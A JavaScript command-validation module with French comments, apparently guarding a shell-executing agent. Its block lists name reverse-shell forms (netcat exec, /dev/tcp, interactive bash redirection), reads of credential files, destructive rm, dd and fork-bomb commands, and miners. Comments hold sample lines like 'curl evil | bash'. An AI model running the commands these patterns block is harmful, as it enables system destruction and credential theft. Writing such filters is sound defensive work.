// agents/antivirus.js
// ============================================
// 🛡️ ANTIVIRUS — Validation des commandes shell
// ============================================
// Corrige les bugs identifiés dans l'audit :
// - #1 : $() et backticks restreints aux vraies menaces
// - #2 : curl/wget validés par parsing d'URL (pas regex)
// - #5 : .env.example/.sample/.template autorisés
// - #6 : flag /i sur toutes les regex (SUDO, RM -RF...)
// - #7 : rm -fr /, rm -r -f /, rm -Rf / détectés
// - #8 : nc -c, ncat --exec détectés
// - #9 : /etc/passwd, /etc/shadow indépendants de la commande
// - #10 : .ssh/, .aws/ indépendants de la commande
// - #11 : curl | sudo bash, curl | /bin/bash détectés
// - #12 : apt-get update retiré (inutile de bloquer)
// - #13 : github.com.evil.com et github.com@evil.com bloqués
// - #14 : DEJA_INSTALLEES supprimé (code mort)
// - #16 : mode 'strict' supprimé (inatteignable)
// ============================================

const BLACKLIST_COMMANDES = [
  // === Destruction système ===
  // Toutes variations de flags rm -rf
  /rm\s+-(?:rf|fr|Rf|rF|r\s+-f|f\s+-r)\s+\/(?:\s|$|\*)/i,
  /rm\s+-(?:rf|fr|Rf|rF|r\s+-f|f\s+-r)\s+~\//i,
  /mkfs/i,
  /dd\s+if=/i,
  /:\(\)\s*\{\s*:\|:&\s*\};:/,

  // === Élévation de privilèges ===
  /^\s*sudo\s+/i,
  /^\s*su\s+/i,
  /chmod\s+777\s+\//i,
  /chown\s+root/i,

  // === Réseau dangereux (reverse shell) ===
  /\bn(?:c|cat)\s+(?:-e|-c|--exec)/i,
  /bash\s+-i\s+>&/i,
  /\/dev\/tcp\//i,

  // === Accès aux credentials (indépendant de la commande) ===
  /\.ssh\//i,
  /\.aws\//i,
  /\/etc\/(?:passwd|shadow)/i,
  // .env mais PAS .env.example, .env.sample, .env.template, .env.test
  /\.env(?!\.(?:example|sample|template|test))/i,
  /\.git-credentials/i,

  // === Exfiltration via pipe shell ===
  // curl evil | bash, curl evil | sudo bash, curl evil | /bin/bash
  /\|\s*(?:sudo\s+)?(?:\/bin\/)?(?:ba)?sh\b/i,
  // bash <(curl evil)
  /<\(\s*(?:curl|wget)/i,

  // === Cryptojacking ===
  /xmrig/i,
  /minerd/i,
];

// Domaines autorisés pour curl/wget (avec support sous-domaines)
const WHITELIST_DOMAINES = [
  'github.com',
  'raw.githubusercontent.com',
  'registry.npmjs.org',
  'npmjs.com',
  'pypi.org',
  'files.pythonhosted.org',
  'nodejs.org',
  'deb.debian.org',
  'archive.ubuntu.com',
  'security.debian.org',
  'security.ubuntu.com',
  'rustup.rs',
];

// Chemins protégés (accès refusé même en lecture)
const CHEMINS_PROTEGES = [
  '/etc/',
  '/root/',
  '/home/other/',
  '/var/www/',
  '/opt/kenny/',
  '~/.ssh/',
  '~/.aws/',
];

// Patterns critiques : bloqués MÊME en mode libre
const PATTERNS_CRITIQUES = [
  // Substitution de commande dangereuse (pas juste $() tout court)
  /\$\(\s*(?:curl|wget|nc|bash|sh|rm|dd|mkfs|cat\s+\/etc)/i,
  /`\s*(?:curl|wget|nc|bash|sh|rm|dd|mkfs|cat\s+\/etc)/i,
  // eval/exec réels (pas echo "eval")
  /\beval\s+/i,
  /\bexec\s+/i,
  // Écriture directe sur block device
  />\s*\/dev\/(?:sd|nvme|hd)/i,
];

// ============================================
// HELPERS
// ============================================

/**
 * Vérifie si une URL appartient à un domaine whitelisté
 * Supporte les sous-domaines : api.github.com ✅, github.com.evil.com ❌
 */
function urlAutorisee(urlStr) {
  try {
    const u = new URL(urlStr);
    const host = u.hostname.toLowerCase();
    return WHITELIST_DOMAINES.some(d => host === d || host.endsWith('.' + d));
  } catch {
    // URL invalide (ex: curl github.com sans https://) → refusée
    return false;
  }
}

/**
 * Extrait toutes les URLs http(s) d'une commande
 * Évite les pièges : github.com@evil.com, ?redirect=github.com
 */
function extraireUrls(cmd) {
  const urls = [];
  const re = /https?:\/\/[^\s"'`|;()<>]+/gi;
  let m;
  while ((m = re.exec(cmd)) !== null) {
    // Nettoyer les caractères de fin parasites
    urls.push(m[0].replace(/[,.:;!?]+$/, ''));
  }
  return urls;
}

/**
 * Vérifie toutes les URLs d'une commande curl/wget
 * Retourne null si tout va bien, sinon la raison du refus
 */
function verifierCurlWget(cmd) {
  if (!/\b(?:curl|wget)\b/i.test(cmd)) return null;
  const urls = extraireUrls(cmd);
  // curl sans URL = probablement --version ou --help → OK
  if (urls.length === 0) return null;
  for (const u of urls) {
    if (!urlAutorisee(u)) {
      return `Domaine non autorisé : ${u}`;
    }
  }
  return null;
}

// ============================================
// NETTOYAGE
// ============================================

/**
 * Supprime les caractères de contrôle qui pourraient bypass les regex
 * Ex: "rm\x00-rf /" devient "rm-rf /" (moins dangereux qu'avec \x00)
 */
function nettoyerCommande(commande) {
  return commande.replace(/[\x00-\x1F\x7F]/g, '').trim();
}

// ============================================
// VALIDATION PRINCIPALE
// ============================================

function verifierCommande(commande, mode = 'normal') {
  const cmd = commande.trim();
  if (!cmd) {
    return { allowed: false, level: 'error', reason: 'Commande vide' };
  }

  // === ÉTAPE 1 : BLACKLIST (toujours active, tous modes) ===
  for (const pattern of BLACKLIST_COMMANDES) {
    if (pattern.test(cmd)) {
      return {
        allowed: false,
        level: 'danger',
        reason: `🚫 Commande bloquée (blacklist) : ${pattern.source}`,
        needsConfirmation: false,
      };
    }
  }

  // === ÉTAPE 2 : MODE LIBRE (utilisé par server.js) ===
  // Plus permissif mais garde les garde-fous essentiels
  if (mode === 'libre') {
    // Chemins protégés
    for (const chemin of CHEMINS_PROTEGES) {
      if (cmd.includes(chemin)) {
        return {
          allowed: false,
          level: 'danger',
          reason: `🚫 Accès refusé : ${chemin}`,
          needsConfirmation: false,
        };
      }
    }

    // Patterns critiques (eval, exec, sub dangereuses, block devices)
    for (const pattern of PATTERNS_CRITIQUES) {
      if (pattern.test(cmd)) {
        return {
          allowed: false,
          level: 'warning',
          reason: `🚫 Pattern critique : ${pattern.source}`,
          needsConfirmation: false,
        };
      }
    }

    // Validation URL pour curl/wget
    const raisonCurl = verifierCurlWget(cmd);
    if (raisonCurl) {
      return {
        allowed: false,
        level: 'warning',
        reason: `🚫 ${raisonCurl}`,
        needsConfirmation: false,
      };
    }

    return {
      allowed: true,
      level: 'info',
      reason: '✅ Commande validée (mode libre)',
      needsConfirmation: false,
    };
  }

  // === ÉTAPE 3 : MODE NORMAL (plus strict, avec confirmation) ===
  // Chemins protégés
  for (const chemin of CHEMINS_PROTEGES) {
    if (cmd.includes(chemin)) {
      return {
        allowed: false,
        level: 'danger',
        reason: `🚫 Chemin protégé : ${chemin}`,
        needsConfirmation: false,
      };
    }
  }

  // Validation URL pour curl/wget
  const raisonCurl = verifierCurlWget(cmd);
  if (raisonCurl) {
    return {
      allowed: false,
      level: 'warning',
      reason: `⚠️ ${raisonCurl}`,
      needsConfirmation: true,
    };
  }

  // Patterns critiques (avec confirmation)
  for (const pattern of PATTERNS_CRITIQUES) {
    if (pattern.test(cmd)) {
      return {
        allowed: false,
        level: 'warning',
        reason: `⚠️ Pattern suspect : ${pattern.source}`,
        needsConfirmation: true,
      };
    }
  }

  return {
    allowed: true,
    level: 'info',
    reason: '✅ Commande validée',
    needsConfirmation: false,
  };
}

// ============================================
// EXPORTS
// ============================================

module.exports = { verifierCommande, nettoyerCommande };
